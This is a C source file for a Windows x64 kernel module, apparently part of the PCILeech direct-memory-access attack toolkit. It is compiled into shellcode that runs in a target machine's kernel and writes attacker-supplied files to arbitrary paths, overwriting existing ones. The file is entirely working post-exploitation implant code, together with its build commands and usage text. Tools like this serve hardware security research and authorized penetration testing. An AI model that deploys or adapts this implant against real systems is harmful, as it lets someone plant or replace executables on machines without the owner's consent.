// wx64_filepush.c : kernel code to push files to target system.
// Compatible with Windows x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_filepush.c
// ml64 wx64_common_a.asm /Fewx64_filepush.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_filepush.obj wx64_common.obj
// shellcode64.exe -o wx64_filepush.exe "PUSH FILES TO TARGET SYSTEM                                    \n===============================================================\nPush a file from the local system to the target system.        \nWARNING! Existing files will be overwritten!                   \nREQUIRED OPTIONS:                                              \n  -in  : file to push to target system from this system.       \n         filename is given in normal format.                   \n         Example: '-in c:\temp\myexefile.exe'                  \n  -s : file on target system.                                  \n         filename is given in kernel format (\??\-prefix)      \n         Example: '-s \??\c:\program files\myexefile.exe'      \n===== PUSH ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nNTSTATUS      : 0x%08X\nBYTES WRITTEN : 0x%08X\n===============================================================\n"
// 
#include "wx64_common.h"

#define STATUS_UNSUCCESSFUL						0xC0000001
#define OBJ_CASE_INSENSITIVE    				0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT			0x00000020
#define FILE_OVERWRITE_IF						0x00000005
#define OBJ_KERNEL_HANDLE       				0x00000200

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	NTSTATUS nt;
	HANDLE hFile;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	ANSI_STRING _sa;
	UNICODE_STRING _su;
	KERNEL_FUNCTIONS ofnk;
	PKERNEL_FUNCTIONS fnk;
	if(!pk->dataInStr[0]) {
		pk->dataOut[0] = (QWORD)STATUS_UNSUCCESSFUL;
		return;
	}
	// initialize kernel functions and strings
	InitializeKernelFunctions(pk->AddrKernelBase, &ofnk);
	fnk = &ofnk;
	fnk->RtlInitAnsiString(&_sa, pk->dataInStr);
	fnk->RtlCopyMemory(pk->dataOutStr, pk->dataInStr, 260);
	fnk->RtlAnsiStringToUnicodeString(&_su, &_sa, TRUE);	
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(
		&_oa, 
		&_su,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);
	// open, write and close file.
	if(fnk->KeGetCurrentIrql() != PASSIVE_LEVEL) {
		pk->dataOut[0] = (QWORD)STATUS_UNSUCCESSFUL;
		goto cleanup;
	}
	nt = fnk->ZwCreateFile(&hFile, GENERIC_WRITE, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if(0 != nt) {
		pk->dataOut[0] = nt;
		goto cleanup;
	}
	nt = fnk->ZwWriteFile(hFile, NULL, NULL, NULL, &_io, (PVOID)(pk->DMAAddrVirtual + pk->dataInExtraOffset), (ULONG)pk->dataInExtraLength, 0, 0);
	fnk->ZwClose(hFile);
	if(0 != nt) {
		pk->dataOut[0] = nt;
		goto cleanup;
	}
	pk->dataOut[1] = pk->dataInExtraLength;
cleanup:
	fnk->RtlFreeUnicodeString(&_su);
}